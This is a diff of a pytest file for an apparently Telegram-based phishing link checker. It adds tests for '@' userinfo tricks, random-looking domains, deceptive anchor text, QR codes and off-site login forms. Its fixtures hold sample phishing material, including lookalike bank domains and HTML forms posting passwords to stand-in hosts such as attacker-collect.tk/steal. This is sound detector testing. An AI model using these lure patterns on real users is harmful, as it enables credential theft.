@@ -7,11 +7,22 @@ fakes so the merged-verdict logic can be verified deterministically.
 """
 
 import asyncio
+import datetime
 
 import pytest
+from telegram import Chat, Message, MessageEntity
 
-from bot.linkchecker import network, pipeline, threat_intel, vectors
-from bot.linkchecker.lexical import check_url, extract_urls, registered_domain
+from bot.url_checker import pipeline
+from bot.url_checker.features import network, threat_intel, vectors
+from bot.url_checker.features.lexical import (
+    check_anchor_mismatch,
+    check_url,
+    domain_entropy,
+    extract_urls,
+    registered_domain,
+)
+from bot.url_checker.features.qr_decode import decode_qr
+from bot.url_checker.message.handler import extract_text_link_entities
 
 
 # --- lexical analyzer (existing behaviour, still intact) ---------------
@@ -22,6 +33,33 @@ def test_extract_urls_finds_bare_and_full_links():
     assert any("bit.ly" in u for u in urls)
 
 
+def test_extract_urls_preserves_userinfo_credential_trick():
+    # Regression: extract_urls() used to silently truncate past '@'
+    # (treating it as pure URL syntax), handing check_url() only the
+    # real destination and losing the exact evidence its own '@'
+    # check depends on - making that check permanently unreachable via
+    # normal message scanning. The classic trick: a real-looking brand
+    # domain before '@', the actual destination after it.
+    urls = extract_urls("go to real-bank.com@evil-site.tk now")
+    assert urls == ["real-bank.com@evil-site.tk"]  # one match, not truncated to "evil-site.tk"
+
+    v = check_url(urls[0])
+    assert v["host"] == "evil-site.tk"  # that's genuinely where a click would land
+    assert any("trick to hide the real destination" in r for r in v["reasons"])
+
+
+def test_extract_urls_userinfo_trick_works_bare_too():
+    # No scheme, no path - still must not be silently dropped, since
+    # extract_urls() already treats bare domains as checkable links
+    # elsewhere; "abab@nk.com" also happens to de-leet to
+    # "ababank.com" ('@' -> 'a'), a second, independent red flag on
+    # top of the '@' trick itself.
+    urls = extract_urls("abab@nk.com")
+    assert urls == ["abab@nk.com"]
+    v = check_url(urls[0])
+    assert v["level"] != "safe"
+
+
 def test_check_url_flags_raw_ip():
     v = check_url("http://192.168.13.37/login")
     assert v["level"] != "safe"
@@ -30,6 +68,67 @@ def test_check_url_flags_raw_ip():
 def test_registered_domain_handles_multi_level_suffix():
     assert registered_domain("www.bank.com.kh") == "bank.com.kh"
     assert registered_domain("mail.google.com") == "google.com"
+
+
+# --- URL string entropy ---------------------------------------------------
+
+def test_domain_entropy_higher_for_diverse_characters():
+    # Not a claim that entropy alone separates random from real (it
+    # doesn't reliably at domain-name lengths - see the digit-gating
+    # test below) - just checking the raw math does what it says.
+    assert domain_entropy("aaaaaaaa") == 0.0
+    assert domain_entropy("ab12cd34") > domain_entropy("aaaacccc")
+
+
+def test_check_url_flags_digit_mixed_random_domain():
+    v = check_url("http://xk4j9fzqp2m.tk/login")
+    assert any("randomly generated" in r for r in v["reasons"])
+
+
+def test_check_url_does_not_flag_real_words_as_random():
+    # The false-positive case entropy-alone would get wrong: a real
+    # dictionary word can have higher raw character diversity than a
+    # short random string, but it never mixes digits into the name.
+    for url in (
+        "https://ababank.com",
+        "https://subscription-service.com",
+        "https://verification-portal.com",
+    ):
+        v = check_url(url)
+        assert not any("randomly generated" in r for r in v["reasons"]), url
+
+
+def test_check_url_skips_entropy_when_already_a_brand_disguise():
+    # "paypal-4x7k9m2p" clears both the length and digit-mix gates and
+    # would score above the entropy threshold on its own (verified:
+    # ~3.46 bits/char) - but since the brand-buried check already
+    # fires on it, it should get that ONE reason, not a second
+    # redundant "looks random" reason stacked on top.
+    v = check_url("http://paypal-4x7k9m2p.com/login")
+    reasons_text = " ".join(v["reasons"])
+    assert "PayPal" in reasons_text
+    assert "randomly generated" not in reasons_text
+
+
+# --- anchor-text mismatch (Telegram text_link entities) -------------------
+
+def test_check_anchor_mismatch_flags_url_shaped_display_text():
+    result = check_anchor_mismatch("https://ababank.com", "http://ababank-secure-login.tk/verify")
+    assert result is not None
+    points, reason = result
+    assert points > 0
+    assert "ababank.com" in reason
+    assert "ababank-secure-login.tk" in reason
+
+
+def test_check_anchor_mismatch_ignores_ordinary_link_text():
+    # "Click here" isn't URL-shaped, so there's nothing to compare -
+    # this must NOT flag every normal hyperlink in existence.
+    assert check_anchor_mismatch("Click here for your account", "http://ababank-secure-login.tk/verify") is None
+
+
+def test_check_anchor_mismatch_allows_matching_domains():
+    assert check_anchor_mismatch("https://ababank.com/login", "https://ababank.com/login?ref=sms") is None
 
 
 # --- embeddings & vector search -----------------------------------------
@@ -95,7 +194,102 @@ def test_extract_page_text_strips_scripts():
     assert "evil()" not in text
 
 
+# --- form/password field detection -----------------------------------------
+
+def test_has_password_field_detects_login_form():
+    html = '<form><input type="text" name="u"><input type="password" name="p"></form>'
+    assert network.has_password_field(html)
+
+
+def test_has_password_field_false_when_absent():
+    assert not network.has_password_field("<form><input type='text'></form>")
+
+
+def test_find_form_actions_extracts_targets():
+    html = '<form action="https://attacker.tk/steal"></form><form action="/login"></form>'
+    assert network.find_form_actions(html) == ["https://attacker.tk/steal", "/login"]
+
+
+# --- QR code decoding -------------------------------------------------
+
+def test_decode_qr_reads_a_real_generated_code():
+    import io
+    import qrcode
+
+    img = qrcode.make("http://free-prize-winner.tk/claim")
+    buf = io.BytesIO()
+    img.save(buf, format="PNG")
+
+    assert decode_qr(buf.getvalue()) == "http://free-prize-winner.tk/claim"
+
+
+def test_decode_qr_returns_none_for_non_qr_image():
+    import io
+    from PIL import Image
+
+    img = Image.new("RGB", (50, 50), color="white")
+    buf = io.BytesIO()
+    img.save(buf, format="PNG")
+
+    assert decode_qr(buf.getvalue()) is None
+
+
+def test_decode_qr_never_crashes_on_garbage_bytes():
+    assert decode_qr(b"not an image at all") is None
+    assert decode_qr(b"") is None
+
+
+# --- caption blindness fix (photo/document TEXT_LINK entities) -----------
+
+def _caption_message(caption: str, entities: list[MessageEntity]) -> Message:
+    return Message(
+        message_id=1,
+        date=datetime.datetime.now(),
+        chat=Chat(id=1, type=Chat.PRIVATE),
+        caption=caption,
+        caption_entities=entities,
+        text=None,
+    )
+
+
+def test_extract_text_link_entities_reads_caption_entities():
+    # Regression: a photo/document caption hides its TEXT_LINK entity in
+    # message.caption_entities, not message.entities - a message with no
+    # .text used to make this helper (and handle_url entirely) blind to
+    # a "Click here"-style deceptive link attached to a file/photo.
+    caption = "Click here"
+    entity = MessageEntity(
+        type=MessageEntity.TEXT_LINK, offset=0, length=len(caption),
+        url="http://free-prize-winner.tk/claim",
+    )
+    message = _caption_message(caption, [entity])
+
+    assert extract_text_link_entities(message) == [
+        ("Click here", "http://free-prize-winner.tk/claim")
+    ]
+
+
+def test_extract_text_link_entities_empty_for_plain_caption():
+    message = _caption_message("just a normal caption, no link", [])
+    assert extract_text_link_entities(message) == []
+
+
 # --- orchestrator merge logic (network faked) -----------------------------
+
+@pytest.fixture(autouse=True)
+def _no_real_tls_handshakes(monkeypatch):
+    """cert_issued_days_ago does a REAL TLS handshake (ssl/socket, up to
+    an 8s timeout per unresolvable host) - autouse so every test in this
+    file gets a fast, deterministic stub without each one needing to
+    remember it, the same way domain_age_days/resolve_host are stubbed
+    per-test below. Individual tests can still override this via their
+    own monkeypatch.setattr if they specifically want to test cert-age
+    scoring.
+    """
+    async def fake_cert_age(host, port=443):
+        return None
+    monkeypatch.setattr(pipeline, "cert_issued_days_ago", fake_cert_age)
+
 
 class _FakeNet:
     def __init__(self, **overrides):
@@ -129,7 +323,200 @@ def _use_tmp_db(monkeypatch, db_path):
     # Both modules do `from bot.config import SCAN_LOG_DB` at import
     # time, so patch each module's own binding, not bot.config.
     monkeypatch.setattr(vectors, "SCAN_LOG_DB", db_path)
-    monkeypatch.setattr("bot.linkchecker.domain_info.SCAN_LOG_DB", db_path)
+    monkeypatch.setattr("bot.url_checker.features.domain_info.SCAN_LOG_DB", db_path)
+
+
+def _stub_out_network(monkeypatch, tls_valid=True):
+    """Minimal network/DNS/age stubs for tests that only care about the
+    lexical/anchor-mismatch signal, not the network layer."""
+    async def fake_trace(url):
+        return _FakeNet(reachable=True, status=200, tls_valid=tls_valid).result
+
+    async def fake_age(host):
+        return None
+
+    async def fake_resolve(host):
+        return ["103.1.2.3"]
+
+    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
+    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
+    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
+
+
+def test_analyze_url_flags_cross_domain_credential_exfiltration(seeded_vectors, monkeypatch):
+    # The actual "form action inspection" case: a login form that's
+    # visually on the scanned page but POSTs the password somewhere
+    # else entirely - the pattern a fake login page needs to work.
+    fake = _FakeNet(
+        reachable=True, status=200, tls_valid=True,
+        final_url="http://ababank-login.tk/",
+        page_html='<form action="https://attacker-collect.tk/steal" method="post">'
+                   '<input type="password" name="pass"></form>',
+        page_text="please enter your password to continue",
+    )
+
+    async def fake_trace(url):
+        return fake.result
+
+    async def fake_age(host):
+        return None
+
+    async def fake_resolve(host):
+        return ["1.2.3.4"]
+
+    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
+    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
+    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
+    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)
+
+    verdict = asyncio.run(pipeline.analyze_url("http://ababank-login.tk/"))
+
+    assert any("credential-theft pattern" in r for r in verdict["reasons"])
+    assert any("attacker-collect.tk" in r for r in verdict["reasons"])
+
+
+def test_analyze_url_does_not_flag_same_origin_login_form(seeded_vectors, monkeypatch):
+    # A login form that submits back to its own page/domain is
+    # completely normal - must not be flagged just for existing.
+    fake = _FakeNet(
+        reachable=True, status=200, tls_valid=True,
+        final_url="https://www.some-real-shop.com/",
+        page_html='<form action="/login" method="post">'
+                   '<input type="password" name="pass"></form>'
+                   + ("Welcome to our shop. " * 30),  # clear the near-dup length gate
+        page_text="Welcome to our shop, please log in. " * 30,
+    )
+
+    async def fake_trace(url):
+        return fake.result
+
+    async def fake_age(host):
+        return 900
+
+    async def fake_resolve(host):
+        return ["1.2.3.4"]
+
+    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
+    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
+    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
+    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)
+
+    verdict = asyncio.run(pipeline.analyze_url("https://www.some-real-shop.com/"))
+
+    assert not any("credential-theft pattern" in r for r in verdict["reasons"])
+
+
+def test_check_message_full_sees_link_hidden_entirely_behind_entity_text(seeded_vectors, monkeypatch):
+    # The message's VISIBLE text has no URL in it at all ("Click here")
+    # - extract_urls() alone would return zero verdicts here, exactly
+    # the invisible-link blind spot this closes. The real destination
+    # only exists in the Telegram TEXT_LINK entity, passed as hidden_links.
+    _stub_out_network(monkeypatch)
+    assert extract_urls("Click here") == []
+
+    verdicts = asyncio.run(pipeline.check_message_full(
+        "Click here",
+        hidden_links=[("Click here", "http://free-prize-winner.tk/claim")],
+    ))
+
+    assert len(verdicts) == 1
+    assert verdicts[0]["host"] == "free-prize-winner.tk"
+
+
+def test_check_message_full_scores_anchor_text_mismatch(seeded_vectors, monkeypatch):
+    # Display text claims the official bank domain; the entity's real
+    # url goes somewhere else entirely - the deceptive case the
+    # mismatch check specifically targets. Two verdicts come back: the
+    # visible display text ("https://ababank.com" is real text in the
+    # message) gets its own normal check, and the hidden entity's
+    # actual destination gets analyzed separately with the mismatch
+    # reason attached.
+    _stub_out_network(monkeypatch)
+
+    verdicts = asyncio.run(pipeline.check_message_full(
+        "https://ababank.com",
+        hidden_links=[("https://ababank.com", "http://ababank-secure-login.tk/verify")],
+    ))
+
+    assert len(verdicts) == 2
+    phishing = next(v for v in verdicts if v["host"] == "ababank-secure-login.tk")
+    assert phishing["level"] == "dangerous"
+    assert any("not the real destination" in r for r in phishing["reasons"])
+
+
+def test_check_message_full_does_not_duplicate_a_link_already_visible(seeded_vectors, monkeypatch):
+    # If the same url is already in the visible text, the hidden_links
+    # entry for it must not produce a second, duplicate verdict.
+    _stub_out_network(monkeypatch)
+
+    verdicts = asyncio.run(pipeline.check_message_full(
+        "check https://ababank.com please",
+        hidden_links=[("https://ababank.com", "https://ababank.com")],
+    ))
+
+    assert len(verdicts) == 1
+
+
+def test_analyze_url_does_not_flag_near_dup_on_degenerate_page_text(seeded_vectors, monkeypatch):
+    # Regression test for a real false positive hit live: a bot-blocked
+    # /CAPTCHA/JS-only page (common on sites with real anti-bot defenses
+    # - this exact case was Amazon) returns near-empty text after
+    # tag-stripping. MinHash on near-empty text is degenerate - two
+    # completely UNRELATED sites that both happen to return "\n" as
+    # their page text used to hash to ~100% "similar", with zero actual
+    # content in common, and Amazon got flagged as near-identical to an
+    # unrelated typosquat domain purely because of this.
+    vectors.store_page_signature("totally-unrelated-site.tk", "\n")
+
+    async def near_empty_trace(url):
+        return _FakeNet(reachable=True, status=200, tls_valid=True,
+                         final_url="https://www.amazon.com/",
+                         page_html="<html></html>", page_text="\n").result
+
+    async def fake_age(host):
+        return None
+
+    async def fake_resolve(host):
+        return ["103.1.2.3"]
+
+    monkeypatch.setattr(pipeline.network, "trace", near_empty_trace)
+    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
+    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
+
+    verdict = asyncio.run(pipeline.analyze_url("https://www.amazon.com/"))
+
+    assert not any("near-identical" in r for r in verdict["reasons"])
+
+
+def test_analyze_url_does_not_flag_near_dup_on_generic_challenge_page(seeded_vectors, monkeypatch):
+    # A second, sneakier version of the same bug: a bot-challenge page
+    # (Cloudflare "Checking your browser...", reCAPTCHA wall) is real,
+    # non-empty text - not caught by an empty-text guard alone - but
+    # it's IDENTICAL boilerplate across countless unrelated sites.
+    # Confirmed live: linkedin.com's real 191-char challenge page still
+    # spuriously matched another site's copy of the same text.
+    challenge_page = "Checking your browser before accessing the site.\n" \
+                      "This process is automatic. Please wait a moment."
+    vectors.store_page_signature("totally-unrelated-site.tk", challenge_page)
+
+    async def challenge_trace(url):
+        return _FakeNet(reachable=True, status=200, tls_valid=True,
+                         final_url="https://www.linkedin.com/",
+                         page_html="<html></html>", page_text=challenge_page).result
+
+    async def fake_age(host):
+        return None
+
+    async def fake_resolve(host):
+        return ["103.1.2.3"]
+
+    monkeypatch.setattr(pipeline.network, "trace", challenge_trace)
+    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
+    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
+
+    verdict = asyncio.run(pipeline.analyze_url("https://www.linkedin.com/"))
+
+    assert not any("near-identical" in r for r in verdict["reasons"])
 
 
 def test_analyze_url_merges_network_signals(seeded_vectors, monkeypatch):
@@ -317,7 +704,7 @@ def test_cross_domain_shortener_still_rescored(seeded_vectors, monkeypatch):
 
 # --- Flow 3: VirusTotal threat intelligence -------------------------------
 
-from bot.linkchecker import threat_intel
+from bot.url_checker.features import threat_intel
 
 
 def test_vt_score_thresholds():
